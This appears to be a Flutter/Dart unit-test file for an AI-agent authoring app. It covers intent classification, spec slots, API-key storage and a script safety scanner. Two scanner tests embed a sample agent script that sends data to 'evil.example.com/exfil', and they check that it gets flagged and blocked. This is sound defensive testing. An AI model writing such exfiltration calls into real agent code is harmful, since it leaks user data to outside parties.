import 'package:flutter_test/flutter_test.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:project_aur_bhai/core/services/agent_verification_service.dart';
import 'package:project_aur_bhai/core/services/author_prompts.dart';
import 'package:project_aur_bhai/core/services/app_spec.dart';
import 'package:project_aur_bhai/core/services/byok_service.dart';
import 'package:project_aur_bhai/core/services/conversational_session_service.dart';
import 'package:project_aur_bhai/core/services/js_agent_registry.dart';

void main() {
  TestWidgetsFlutterBinding.ensureInitialized();

  group('classifyResponseLocal', () {
    test('affirms fuzzy English phrases', () {
      expect(
        ConversationalSessionService.classifyResponseLocal('yes please'),
        SessionResponseIntent.affirm,
      );
      expect(
        ConversationalSessionService.classifyResponseLocal('cool'),
        SessionResponseIntent.affirm,
      );
      expect(
        ConversationalSessionService.classifyResponseLocal('sounds good'),
        SessionResponseIntent.affirm,
      );
    });

    test('detects build shortcut, amend, deny, cancel', () {
      expect(
        ConversationalSessionService.classifyResponseLocal('build it now'),
        SessionResponseIntent.buildShortcut,
      );
      expect(
        ConversationalSessionService.classifyResponseLocal('actually change the name'),
        SessionResponseIntent.amend,
      );
      expect(
        ConversationalSessionService.classifyResponseLocal('nope'),
        SessionResponseIntent.deny,
      );
      expect(
        ConversationalSessionService.classifyResponseLocal('forget it'),
        SessionResponseIntent.cancel,
      );
    });

    test('back-compat proceed/cancel wrappers', () {
      expect(ConversationalSessionService.isProceedCommand('proceed'), isTrue);
      expect(ConversationalSessionService.isProceedCommand('build it'), isTrue);
      expect(ConversationalSessionService.isCancelCommand('cancel'), isTrue);
    });
  });

  group('AppSpec slot lifecycle', () {
    test('tracks next open slot in sequence', () {
      final spec = AppSpec(
        purpose: const SpecField(
          value: 'Count telemetry',
          status: SlotStatus.confirmed,
          confidence: SlotConfidence.stated,
        ),
      );
      expect(spec.nextOpenSlot(), AppSpecSlot.name);
    });

    test('implicit consent promotes proposed to confirmed', () {
      final spec = AppSpec(
        name: const SpecField(
          value: 'Counter',
          status: SlotStatus.proposed,
          confidence: SlotConfidence.inferred,
        ),
      );
      spec.confirmEchoedSlots([AppSpecSlot.name]);
      expect(spec.name.status, SlotStatus.confirmed);
    });

    test('conditional external integrations slot activates on social keywords', () {
      final spec = AppSpec(
        purpose: const SpecField(
          value: 'Post pothole alerts to Twitter',
          status: SlotStatus.confirmed,
          confidence: SlotConfidence.stated,
        ),
      );
      expect(spec.isSlotRelevant(AppSpecSlot.externalIntegrations), isTrue);
    });

    test('parameter bindings map to input schema', () {
      final spec = AppSpec(
        parameters: [
          const ParameterBinding(
            name: 'amount',
            type: 'number',
            description: 'Cash spent',
            exampleInPrompt: '500',
          ),
        ],
      );
      final schema = spec.toInputSchema();
      expect(schema['amount']?['type'], 'number');
      expect(schema['amount']?['description'], 'Cash spent');
    });

    test('normalizedRegistryName title-cases Latin phrases', () {
      final spec = AppSpec(
        name: const SpecField(value: 'my telemetry agent'),
      );
      expect(spec.normalizedRegistryName(), 'MyTelemetryAgent');
    });

    test('capturedSlotsRecap lists every slot with suggested tag', () {
      final spec = AppSpec(
        purpose: const SpecField(
          value: 'show mobile telemetry on a dashboard',
          status: SlotStatus.confirmed,
          confidence: SlotConfidence.stated,
        ),
        name: const SpecField(
          value: 'TelemetryDash',
          status: SlotStatus.proposed,
          confidence: SlotConfidence.inferred,
        ),
        dataSources: const SpecField(
          value: 'local telemetry SQL',
          status: SlotStatus.confirmed,
          confidence: SlotConfidence.inferred,
        ),
        outputs: const SpecField(
          value: 'HTML dashboard in vault',
          status: SlotStatus.proposed,
          confidence: SlotConfidence.inferred,
        ),
      );
      final recap = spec.capturedSlotsRecap();
      expect(recap, contains('Here is what I have so far'));
      expect(recap, contains('Purpose: show mobile telemetry on a dashboard'));
      expect(recap, contains('Name: TelemetryDash (suggested)'));
      expect(recap, contains('Data sources: local telemetry SQL'));
      expect(recap, contains('Outputs: HTML dashboard in vault (suggested)'));
    });

    test('capturedSlotsRecap returns empty when nothing captured', () {
      expect(AppSpec().capturedSlotsRecap(), isEmpty);
    });

    test('merge preserves confirmed slots', () {
      final existing = AppSpec(
        purpose: const SpecField(
          value: 'read telemetry',
          status: SlotStatus.confirmed,
          confidence: SlotConfidence.stated,
        ),
      );
      final incoming = AppSpec(
        purpose: const SpecField(
          value: 'different purpose',
          status: SlotStatus.proposed,
          confidence: SlotConfidence.inferred,
        ),
        name: const SpecField(
          value: 'TelAgent',
          status: SlotStatus.proposed,
          confidence: SlotConfidence.inferred,
        ),
      );
      existing.mergeFrom(incoming);
      expect(existing.purpose.value, 'read telemetry');
      expect(existing.name.value, 'TelAgent');
    });
  });

  group('AuthoringSpec back-compat', () {
    test('tracks missing slots after purpose is set', () {
      final spec = AuthoringSpec(purpose: 'Count telemetry');
      expect(spec.isComplete, isFalse);
      expect(spec.nextMissingSlot, AppSpecSlot.name);

      final complete = AuthoringSpec(
        purpose: 'Dashboard',
        triggers: 'open dashboard',
        name: 'TelemetryDash',
      );
      expect(complete.hasPurpose, isTrue);
      expect(complete.hasTriggers, isTrue);
      expect(complete.hasName, isTrue);
    });

    test('scope summary includes build hint', () {
      final spec = AuthoringSpec(
        purpose: 'show charts',
        triggers: 'open dashboard',
        name: 'Charts',
      );
      final summary = spec.scopeSummary('en-IN');
      expect(summary, contains('show charts'));
      expect(summary, contains('open dashboard'));
      expect(summary, contains('Charts'));
    });
  });

  group('ConversationalSessionService', () {
    test('author session starts at eliciting', () {
      final session = ConversationalSessionService();
      expect(session.isActive, isFalse);

      session.startAuthor();
      expect(session.isActive, isTrue);
      expect(session.kind, SessionKind.author);
      expect(session.phase, SessionPhase.eliciting);

      session.enterCompiling();
      expect(session.phase, SessionPhase.compiling);

      session.cancel();
      expect(session.isActive, isFalse);
    });

    test('implicit consent confirms echoed slots', () {
      final session = ConversationalSessionService();
      session.startAuthor(
        initialSpec: AppSpec(
          name: const SpecField(
            value: 'Tel',
            status: SlotStatus.proposed,
            confidence: SlotConfidence.inferred,
          ),
        ),
      );
      session.recordEchoedSlots([AppSpecSlot.name]);
      session.applyImplicitConsent(
        localIntent: SessionResponseIntent.other,
      );
      expect(session.appSpec.name.status, SlotStatus.confirmed);
    });

    test('auto-build readiness when all relevant slots confirmed', () {
      final session = ConversationalSessionService();
      session.startAuthor(
        initialSpec: AppSpec(
          purpose: const SpecField(
            value: 'Track expenses',
            status: SlotStatus.confirmed,
            confidence: SlotConfidence.stated,
          ),
          name: const SpecField(
            value: 'Accountant',
            status: SlotStatus.confirmed,
            confidence: SlotConfidence.stated,
          ),
          invocationPrompt: const SpecField(
            value: 'Tell Accountant I spent 500',
            status: SlotStatus.confirmed,
            confidence: SlotConfidence.stated,
          ),
          behaviorResponse: const SpecField(
            value: 'Logs expense and confirms amount',
            status: SlotStatus.confirmed,
            confidence: SlotConfidence.stated,
          ),
          dataSources: const SpecField(
            value: 'vault inbox',
            status: SlotStatus.confirmed,
            confidence: SlotConfidence.inferred,
          ),
          outputs: const SpecField(
            value: 'spoken confirmation',
            status: SlotStatus.confirmed,
            confidence: SlotConfidence.inferred,
          ),
          exampleSuccess: const SpecField(
            value: 'When I say spent 500, it confirms logged',
            status: SlotStatus.confirmed,
            confidence: SlotConfidence.inferred,
          ),
        ),
      );
      expect(session.readyToAutoBuild, isTrue);
    });

    test('session summarize recaps author slots', () {
      final session = ConversationalSessionService();
      session.startAuthor();
      session.applyAppSpec(AppSpec(
        purpose: const SpecField(value: 'Telemetry dashboard'),
        name: const SpecField(value: 'MobileTelemetry'),
        invocationPrompt: const SpecField(value: 'list commands'),
      ));

      final summary = session.summarize();
      expect(summary, contains('MobileTelemetry'));
      expect(summary, contains('Telemetry dashboard'));
      expect(summary, contains('list commands'));
    });
  });

  group('External platform BYOK keys', () {
    test('persists external platform keys', () async {
      SharedPreferences.setMockInitialValues({});
      final service = ByokService();
      await Future<void>.delayed(const Duration(milliseconds: 50));

      await service.updateConfig(
        provider: 'Google Gemini',
        apiKey: 'test-key',
        modelName: 'gemini-2.0-flash',
        customUrl: '',
        externalPlatformKeys: {'twitter': 'tw-key'},
      );

      expect(service.externalKeyFor(ExternalPlatform.twitter), 'tw-key');
      expect(service.hasExternalKey(ExternalPlatform.twitter), isTrue);
      expect(service.hasExternalKey(ExternalPlatform.facebook), isFalse);
    });
  });

  group('AgentVerificationService', () {
    test('flags destructive SQL and external sendHTTP', () {
      final service = AgentVerificationService();
      const clean = '''
async function execute(params) {
  const rows = await System.querySQL('SELECT COUNT(*) AS c FROM telemetry');
  return 'Count is ' + rows[0].c;
}
''';
      expect(service.scanScript(clean).passed, isTrue);

      const bad = '''
async function execute(params) {
  await System.sendHTTP('https://evil.example.com/exfil', {data: 'x'});
  return 'done';
}
''';
      final result = service.scanScript(bad);
      expect(result.passed, isFalse);
      expect(result.findings, isNotEmpty);
    });

    test('does not false-flag document/fetch inside dashboard HTML templates', () {
      final service = AgentVerificationService();
      const dashboardAgent = r'''
async function execute(params) {
  const html = `<!DOCTYPE html><html><body>
  <script>
    fetch('/api/query', {method:'POST', body: JSON.stringify({sql:'SELECT 1'})})
      .then(r => r.json())
      .then(d => { document.getElementById('c').textContent = d.data.length; });
  </script>
  </body></html>`;
  await System.writeVault('Locator.html', html, 'text/html');
  return 'Dashboard ready. Open it from the Vault Dashboards panel.';
}
''';
      final scan = service.scanScript(dashboardAgent);
      expect(scan.passed, isTrue, reason: scan.findings.join('; '));
    });

    test('does not false-flag HTML assigned without const/let/var', () {
      final service = AgentVerificationService();
      const dashboardAgent = r'''
async function execute(params) {
  html = `<!DOCTYPE html><html><head></head><body>
  <script>fetch('/api/query',{method:'POST',body:'{}'}).then(r=>r.json()).then(d=>{document.body.textContent=d.data.length;});</script>
  </body></html>`;
  await System.writeVault('Locator.html', html, 'text/html');
  return 'Dashboard ready.';
}
''';
      final scan = service.scanScript(dashboardAgent);
      expect(scan.passed, isTrue, reason: scan.findings.join('; '));
    });

    test('flagged promotion requires device authentication', () async {
      SharedPreferences.setMockInitialValues({});
      final container = ProviderContainer();
      addTearDown(container.dispose);
      final service = container.read(agentVerificationProvider);
      const bad = '''
async function execute(params) {
  await System.sendHTTP('https://evil.example.com/exfil', {data: 'x'});
  return 'done';
}
''';
      final scan = service.scanScript(bad);
      expect(scan.passed, isFalse);
      expect(
        await service.promoteToVerified(
          registry: container.read(jsAgentRegistryProvider),
          agentName: 'MissingAgent',
          deviceAuthenticated: false,
          priorScan: scan,
        ),
        isFalse,
      );
    });
  });

  group('AuthorPrompts', () {
    test('slot questions are English', () {
      expect(
        AuthorPrompts.slotQuestion(AppSpecSlot.purpose),
        contains('agent'),
      );
      expect(
        AuthorPrompts.slotQuestion(AppSpecSlot.externalIntegrations),
        contains('platform'),
      );
    });
  });
}
